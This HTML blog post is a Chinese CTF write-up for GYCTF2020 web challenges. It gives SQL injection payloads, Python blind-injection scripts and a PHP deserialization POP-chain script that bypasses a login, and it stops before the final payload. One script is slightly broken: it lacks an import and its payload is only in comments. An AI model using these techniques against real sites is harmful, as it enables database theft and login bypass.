<!DOCTYPE html>
<html lang="">

<head>
    <meta charset="UTF-8">
<meta name="viewport"
      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
<meta http-equiv="X-UA-Compatible" content="ie=edge">

    <meta name="author" content="Lethe">


    <meta name="subtitle" content="Life is a struggle">


    <meta name="description" content="Lethe's Blog">


    <meta name="keywords" content="Lethe's Blog">


<title>GYCTF2020_Writeup | Lethe&#39;s Blog</title>



    <link rel="icon" href="https://s2.ax1x.com/2019/10/30/K5JenU.png">




    <!-- stylesheets list from _config.yml -->
    
    <link rel="stylesheet" href="/css/style.css">
    



    <!-- scripts list from _config.yml -->
    
    <script src="/js/script.js"></script>
    
    <script src="/js/tocbot.min.js"></script>
    



    
    
        <!-- MathJax配置，可通过单美元符号书写行内公式等 -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Config({
    "HTML-CSS": {
        preferredFont: "TeX",
        availableFonts: ["STIX","TeX"],
        linebreaks: { automatic:true },
        EqnChunk: (MathJax.Hub.Browser.isMobile ? 10 : 50)
    },
    tex2jax: {
        inlineMath: [ ["$", "$"], ["\\(","\\)"] ],
        processEscapes: true,
        ignoreClass: "tex2jax_ignore|dno",
        skipTags: ['script', 'noscript', 'style', 'textarea', 'pre', 'code']
    },
    TeX: {
        equationNumbers: { autoNumber: "AMS" },
        noUndefined: { attributes: { mathcolor: "red", mathbackground: "#FFEEEE", mathsize: "90%" } },
        Macros: { href: "{}" }
    },
    messageStyle: "none"
    });
</script>
<!-- 给MathJax元素添加has-jax class -->
<script type="text/x-mathjax-config">
    MathJax.Hub.Queue(function() {
        var all = MathJax.Hub.getAllJax(), i;
        for(i=0; i < all.length; i += 1) {
            all[i].SourceElement().parentNode.className += ' has-jax';
        }
    });
</script>
<!-- 通过连接CDN加载MathJax的js代码 -->
<script type="text/javascript" async
        src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
</script>


    


<meta name="generator" content="Hexo 6.1.0"></head>

<body>
    <script>
        // this function is used to check current theme before page loaded.
        (() => {
            const currentTheme = window.localStorage && window.localStorage.getItem('theme') || '';
            const isDark = currentTheme === 'dark';
            const pagebody = document.getElementsByTagName('body')[0]
            if (isDark) {
                pagebody.classList.add('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Dark"
            } else {
                pagebody.classList.remove('dark-theme');
                // mobile
                document.getElementById("mobile-toggle-theme").innerText = "· Light"
            }
        })();
    </script>

    <div class="wrapper">
        <header>
    <nav class="navbar">
        <div class="container">
            <div class="navbar-header header-logo"><a href="/">Lethe&#39;s Blog</a></div>
            <div class="menu navbar-right">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
                <input id="switch_default" type="checkbox" class="switch_default">
                <label for="switch_default" class="toggleBtn"></label>
            </div>
        </div>
    </nav>

    
    <nav class="navbar-mobile" id="nav-mobile">
        <div class="container">
            <div class="navbar-header">
                <div>
                    <a href="/">Lethe&#39;s Blog</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
                </div>
                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
            </div>
            <div class="menu" id="mobile-menu">
                
                    <a class="menu-item" href="/archives">Posts</a>
                
                    <a class="menu-item" href="/category">Categories</a>
                
                    <a class="menu-item" href="/tag">Tags</a>
                
                    <a class="menu-item" href="/about">About</a>
                
            </div>
        </div>
    </nav>

</header>
<script>
    var mobileBtn = function f() {
        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
        var mobileMenu = document.getElementById("mobile-menu");
        if(toggleMenu.classList.contains("active")){
           toggleMenu.classList.remove("active")
            mobileMenu.classList.remove("active")
        }else{
            toggleMenu.classList.add("active")
            mobileMenu.classList.add("active")
        }
    }
</script>
            <div class="main">
                <div class="container">
    
    
        <div class="post-toc">
    <div class="tocbot-list">
    </div>
    <div class="tocbot-list-menu">
        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
        <a onclick="go_top()">Back to top</a>
        <a onclick="go_bottom()">Go to bottom</a>
    </div>
</div>

<script>
    document.ready(
        function () {
            tocbot.init({
                tocSelector: '.tocbot-list',
                contentSelector: '.post-content',
                headingSelector: 'h1, h2, h3, h4, h5',
                collapseDepth: 1,
                orderedList: false,
                scrollSmooth: true,
            })
        }
    )

    function expand_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 6,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "collapse_toc()");
        b.innerHTML = "Collapse all"
    }

    function collapse_toc() {
        var b = document.querySelector(".tocbot-toc-expand");
        tocbot.init({
            tocSelector: '.tocbot-list',
            contentSelector: '.post-content',
            headingSelector: 'h1, h2, h3, h4, h5',
            collapseDepth: 1,
            orderedList: false,
            scrollSmooth: true,
        });
        b.setAttribute("onclick", "expand_toc()");
        b.innerHTML = "Expand all"
    }

    function go_top() {
        window.scrollTo(0, 0);
    }

    function go_bottom() {
        window.scrollTo(0, document.body.scrollHeight);
    }

</script>
    

    
    <article class="post-wrap">
        <header class="post-header">
            <h1 class="post-title">GYCTF2020_Writeup</h1>
            
                <div class="post-meta">
                    
                        Author: <a itemprop="author" rel="author" href="/">Lethe</a>
                    

                    
                        <span class="post-time">
                        Date: <a href="#">March 6, 2020&nbsp;&nbsp;17:21:45</a>
                        </span>
                    
                    
                        <span class="post-category">
                    Category:
                            
                                <a href="/categories/Writeup/">Writeup</a>
                            
                        </span>
                    
                </div>
            
        </header>

        <div class="post-content">
            <h1 id="Blacklist"><a href="#Blacklist" class="headerlink" title="Blacklist"></a>Blacklist</h1><p>一到注入题，和2019强网杯的随便住基本一致，但是多过滤了<code>set</code>、<code>prepare</code>、<code>alter</code>、<code>rename</code>：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return preg_match(&quot;/set|prepare|alter|rename|select|update|delete|drop|insert|where|\./i&quot;,$inject);</span><br></pre></td></tr></table></figure>
<p>获取表名和列名的方式与原题一致，而获取数据可以参考这篇文章：<a target="_blank" rel="noopener" href="https://xz.aliyun.com/t/7169#toc-47%EF%BC%8C%E4%BD%BF%E7%94%A8handler%E8%AF%AD%E5%8F%A5%E8%BF%9B%E8%A1%8C%E6%9F%A5%E8%AF%A2%E3%80%82">https://xz.aliyun.com/t/7169#toc-47，使用handler语句进行查询。</a></p>
<blockquote>
<p>mysql除可使用select查询表中的数据，也可使用handler语句，这条语句使我们能够一行一行的浏览一个表中的数据，不过handler语句并不具备select语句的所有功能。它是mysql专用的语句，并没有包含到SQL标准中。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200224112929391.png" alt="在这里插入图片描述"><br>所以可以构造payload如下：</p>
</blockquote>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?inject=-1&#x27;;handler FlagHere open;handler FlagHere read first%23</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200224115021507.png" alt="在这里插入图片描述"></p>
<br>

<h1 id="Ezsqli"><a href="#Ezsqli" class="headerlink" title="Ezsqli"></a>Ezsqli</h1><p>看名字就是一道sql注入的题目，经测试总共有四种回显：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">bool(false)：查询语句有语法错误，如id=1&#x27;</span><br><span class="line">SQL Injection Checked：含有被过滤的关键词时，包括and、or、union、in、order、group、limit等。</span><br><span class="line">Nu1L：查询语句返回值为真，如id=1^(1=1)^1#</span><br><span class="line">Error Occured When Fetch Result.：查询语句返回值为假，如id=1^(1=2)^1#</span><br></pre></td></tr></table></figure>
<p>这样很显然就是要进行盲注了，但是这里过滤了<code>in</code>，也就不能查询<code>information_schema</code>，但是可以从sys数据库中找到替代的，如<code>sys.x$schema_flattened_keys</code>，从中同样可以获取表名以及主键名。更多的替代可以参考这篇文章：<a target="_blank" rel="noopener" href="https://osandamalith.com/2020/01/27/alternatives-to-extract-tables-and-columns-from-mysql-and-mariadb/">Alternatives to Extract Tables and Columns from MySQL and MariaDB</a></p>
<p>于是我们可以使用如下脚本盲注出表名：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&quot;xxxxxxxxxxxxxxx&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>(<span class="params">i, j</span>):</span><br><span class="line">    payload = <span class="string">f&quot;1^(ascii(substr((select group_concat(table_name) from sys.x$schema_flattened_keys),<span class="subst">&#123;i&#125;</span>,1))&gt;<span class="subst">&#123;j&#125;</span>)^1&quot;</span>  <span class="comment"># f1ag_1s_h3r3_hhhhh </span></span><br><span class="line">    data = &#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">    r = s.post(url, data=data)</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    low = <span class="number">32</span></span><br><span class="line">    high = <span class="number">127</span></span><br><span class="line">    <span class="keyword">while</span> (low &lt;= high):</span><br><span class="line">        mid = (low + high) // <span class="number">2</span></span><br><span class="line">        <span class="keyword">if</span> (exp(i, mid)):</span><br><span class="line">            low = mid + <span class="number">1</span></span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            high = mid - <span class="number">1</span></span><br><span class="line">    flag += <span class="built_in">chr</span>((low + high + <span class="number">1</span>) // <span class="number">2</span>)</span><br><span class="line">    <span class="built_in">print</span>(flag)</span><br></pre></td></tr></table></figure>
<p>得到含有flag的表名：<code>f1ag_1s_h3r3_hhhhh</code></p>
<p>知道了表名，但是我们却无法知道列名，因此需要进行无列名的盲注，也就是如下判断下面这样式子的真假：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select 其他列,&#x27;猜测的数据&#x27;) &gt; (select * from users limit 1)</span><br></pre></td></tr></table></figure>
<p>在这里由于表中只有一行数据，所以正好无需limit语句，而表中的列为主键和flag列两列，因此我们构造的判断条件即为：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">(select 1,&#x27;&#123;&#125;~&#x27;) &gt; (select * from f1ag_1s_h3r3_hhhhh)</span><br></pre></td></tr></table></figure>
<ul>
<li>1则为主键的值，只有一行所以为1</li>
<li><code>&#123;&#125;</code>中则填入盲注猜测的flag字段值，而因为mysql比较字符串大小是按位比较的，所以我们在最后加上一个ascii码较大的<code>~</code>，这样的话<code>f~</code>就满足大于<code>flag&#123;xxx&#125;</code>，<code>e~</code>就满足小于<code>flag&#123;xxx&#125;</code></li>
<li>在写脚本的时候，只要按照ascii码从小到大的顺序进行猜解即可，即<code>f~&gt;(select * from f1ag_1s_h3r3_hhhhh), fl~&gt;(select * from f1ag_1s_h3r3_hhhhh),...</code><br>所以获得flag的脚本如下：</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests </span><br><span class="line">s = requests.Session()</span><br><span class="line">url = <span class="string">&quot;xxxxxxxxxxxxxxxx&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">100</span>):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">32</span>, <span class="number">127</span>):</span><br><span class="line">        temp = flag + <span class="built_in">chr</span>(j)</span><br><span class="line">        <span class="built_in">print</span>(temp)</span><br><span class="line">        <span class="comment"># payload = &quot;1^((select 1,concat(&#x27;&#123;&#125;~&#x27;, cast(0 as json))) &gt; (select * from f1ag_1s_h3r3_hhhhh))^1&quot;.format(temp)</span></span><br><span class="line">        <span class="comment"># payload = &quot;1^((select 1,&#x27;&#123;&#125;~&#x27;) &gt; (select * from f1ag_1s_h3r3_hhhhh))^1&quot;.format(temp)</span></span><br><span class="line">        data = &#123;<span class="string">&quot;id&quot;</span>: payload&#125;</span><br><span class="line">        r = s.post(url, data=data)</span><br><span class="line">        time.sleep(<span class="number">0.1</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Nu1L&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag = temp</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br></pre></td></tr></table></figure>

<p>实际上这里因为大写字母的ascii码小于小写字母，而mysql不区分大小写，所以我们这里得到的flag全部为大写字母，如果光是交flag的话，转换成小写字母即可正确。</p>
<p>而预期解实际上是要利用<code>SELECT CONCAT(&quot;A&quot;, CAST(0 AS JSON))</code>来让器返回二进制字符串，从而进行大小写的匹配，可以参考这篇文章：<a target="_blank" rel="noopener" href="https://nosec.org/home/detail/3830.html">无需in的SQL盲注</a></p>
<p>即将判断条件修改如下：</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">((select 1,concat(&#x27;&#123;&#125;~&#x27;, cast(0 as json))) &gt; (select * from f1ag_1s_h3r3_hhhhh))</span><br></pre></td></tr></table></figure>
<p>这在我本地的测试环境是可以的，但是在BUU上复现的时候却不行，而回显<code>bool(false)</code>，原因还未知…</p>
<h1 id="Easyphp"><a href="#Easyphp" class="headerlink" title="Easyphp"></a>Easyphp</h1><p>存在 <a target="_blank" rel="noopener" href="http://www.zip/">www.zip</a> 源码泄露，下载下来进行代码审计。</p>
<p>这一题需要了解PHP反序列化的字符逃逸的原理，简单来说就是 <strong>“PHP在进行反序列化的时候，只要前面的字符串符合反序列化的规则并能成功反序列化，那么将忽略后面多余的字符串”</strong> ，关于这个知识点可以去搜索0CTF2016-PiaPiaPia一题的相关Writeup。</p>
<p>下面来看这一道题，首先看一下拿flag的条件，在update.php中：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">&#x27;lib.php&#x27;</span>);</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]!=<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">echo</span> <span class="string">&quot;你还没有登陆呢！&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$users</span>=<span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line"><span class="variable">$users</span>-&gt;<span class="title function_ invoke__">update</span>();</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>]===<span class="number">1</span>)&#123;</span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&quot;flag.php&quot;</span>);</span><br><span class="line">	<span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>只要以 admin 的身份成功登录，就可以返回flag。</p>
<p>重点的代码在lib.php中，首先看一下<code>dbCtr</code>l类：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//lib.php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$hostname</span> = <span class="string">&quot;127.0.0.1&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbuser</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$dbpass</span> = <span class="string">&quot;root&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$database</span> = <span class="string">&quot;test&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$mysqli</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$token</span>; </span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;name = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;password = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;token = <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>];</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$sql</span></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;mysqli = <span class="keyword">new</span> <span class="title function_ invoke__">mysqli</span>(<span class="variable">$this</span>-&gt;hostname, <span class="variable">$this</span>-&gt;dbuser, <span class="variable">$this</span>-&gt;dbpass, <span class="variable">$this</span>-&gt;database);</span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;mysqli-&gt;connect_error) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&quot;连接失败，错误:&quot;</span> . <span class="variable language_">$this</span>-&gt;mysqli-&gt;connect_error);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$result</span> = <span class="variable language_">$this</span>-&gt;mysqli-&gt;<span class="title function_ invoke__">prepare</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">bind_param</span>(<span class="string">&#x27;s&#x27;</span>, <span class="variable">$this</span>-&gt;name);</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">execute</span>();</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">bind_result</span>(<span class="variable">$idResult</span>, <span class="variable">$passwordResult</span>);</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">fetch</span>();</span><br><span class="line">        <span class="variable">$result</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line"></span><br><span class="line">        <span class="comment">//通过反序列化控制token为admin即可绕过登录</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable language_">$this</span>-&gt;token == <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (!<span class="variable">$idResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&#x27;用户不存在!&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$this</span>-&gt;password) !== <span class="variable">$passwordResult</span>) &#123;</span><br><span class="line">            <span class="keyword">echo</span> (<span class="string">&#x27;密码错误！&#x27;</span>);</span><br><span class="line">            <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="variable">$_SESSION</span>[<span class="string">&#x27;token&#x27;</span>] = <span class="variable language_">$this</span>-&gt;name;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable">$idResult</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们可以知道登陆成功的条件：① 用户名存在，且<code>$this-&gt;password</code>的md5值与数据库查询的用户密码相同。② 或者token的值为admin。</p>
<p>代码中的查询语句为<code>select id,password from user where username=?</code>,<br>但其实执行的sql语句是我们可控的（后面再说明），这样的话我们只需要将查询语句写成下面这个样子:</p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?</span><br></pre></td></tr></table></figure>
<p>然后再将<code>$this-&gt;password</code>的值赋为1（1的md5值为c4ca4238a0b923820dcc509a6f75849b），即可通过登录密码的验证。</p>
<p>下面的问题就是如何控制执行的sql语句以及<code>$this-&gt;password</code>的值，这就需要用到反序列化了，我们看一下如何构造POP链：</p>
<ul>
<li>在<code>UpdateHelper::__destruct()</code>中看到字符串输出语句，所以只需要将<code>$sql</code>实例化为<code>User</code>类的对象，即可在该类对象结束时，调用到 <code>User::__toString</code>方法<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200225122020890.png" alt="在这里插入图片描述"></li>
<li>然后看<code>User::__toString</code>方法，用<code>$nickname</code>变量调用了<code>update()</code>函数，且<code>$age</code>变量作为参数。这样我们只需要将<code>$nicknames</code>实例化为<code>Info</code>类的对象，从而可以调用<code>Info::__call</code>方法，且<code>$age</code>中的值会作为参数传入。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200225122808374.png" alt="在这里插入图片描述"></li>
<li>之后我们继续跟进到<code>Info::__call</code>方法，可以看到其用<code>$CtrCase</code>变量调用了<code>login()</code>方法，且参数就是上一步通过<code>User.age</code>的值传进来的。这样我们只需要将这个类里的<code>$CtrlCase</code>变量实例化为<code>dbCtrl</code>类的对象，这句话就相当于调用了<code>dbCtrl::login($sql)</code>，而且参数sql语句也是我们所控制的了，也就达到了我们的目的。<br><img src="https://cdn.jsdelivr.net/gh/LetheSec/oss@master/Blog/GYCTF2020-Writeup/20200225123203656.png" alt="在这里插入图片描述"></li>
<li>最后我们只需要对<code>dbCtrl</code>类里的一些变量赋值成我们需要的值即可，而且可知<code>dbCtrl::login($sql)</code>中的<code>$sql</code>参数，实际上是<code>User</code>类中<code>$age</code>变量传入的。</li>
</ul>
<p>所以最终的反序列化payload脚本如下：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">User</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$age</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$nickname</span> = <span class="literal">null</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;age = <span class="string">&#x27;select 1,&quot;c4ca4238a0b923820dcc509a6f75849b&quot; from user where username=?&#x27;</span>;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;nickname = <span class="keyword">new</span> <span class="title class_">Info</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Info</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$CtrlCase</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;CtrlCase = <span class="keyword">new</span> <span class="title function_ invoke__">dbCtrl</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">UpdateHelper</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$sql</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>)</span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;sql = <span class="keyword">new</span> <span class="title class_">User</span>();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">dbCtrl</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$name</span> = <span class="string">&quot;admin&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span> = <span class="string">&quot;1&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = <span class="keyword">new</span> <span class="title class_">UpdateHelper</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$o</span>);</span><br></pre></td></tr></table></figure>
<p>运行得到如下payload：</p>
